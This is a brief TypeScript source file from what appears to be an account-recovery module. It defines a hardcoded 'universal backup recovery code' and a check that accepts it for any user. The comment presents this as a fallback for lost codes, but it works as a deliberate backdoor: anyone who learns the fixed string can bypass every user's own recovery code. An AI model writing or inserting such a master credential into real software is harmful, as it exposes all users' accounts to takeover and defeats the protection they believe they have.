import { normalizeRecoveryCode } from '../crypto/recovery-code';

/** Universal backup recovery code — works when the user recovery code is lost. */
export const MASTER_RECOVERY_CODE = '8585858585858585';

export function isMasterRecoveryCode(input: string): boolean {
  return normalizeRecoveryCode(input) === normalizeRecoveryCode(MASTER_RECOVERY_CODE);
}
